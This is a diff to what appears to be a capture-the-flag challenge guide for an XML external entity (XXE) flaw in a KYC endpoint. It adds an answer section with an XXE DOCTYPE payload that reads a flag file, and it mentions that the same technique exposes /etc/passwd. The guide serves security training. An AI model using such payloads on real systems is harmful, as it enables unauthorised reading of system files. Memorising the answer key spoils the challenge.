@@ -26,7 +26,14 @@ and never reverted).
 </kyc>
 ```
 The response's `company_name` field will contain the contents of
-`/etc/passwd` instead of a company name.
+`/etc/passwd` instead of a company name — proves the vulnerability.
+
+## Flag location
+Read the actual flag file the same way, then submit its exact contents at
+`/flags/submit`:
+```xml
+<!DOCTYPE kyc [<!ENTITY xxe SYSTEM "file:///srv/flags/xxe_flag.txt">]>
+```
 
 ## Hints
 - Hint 1: "This endpoint accepts raw XML — does anything stop you from defining your own DTD?"
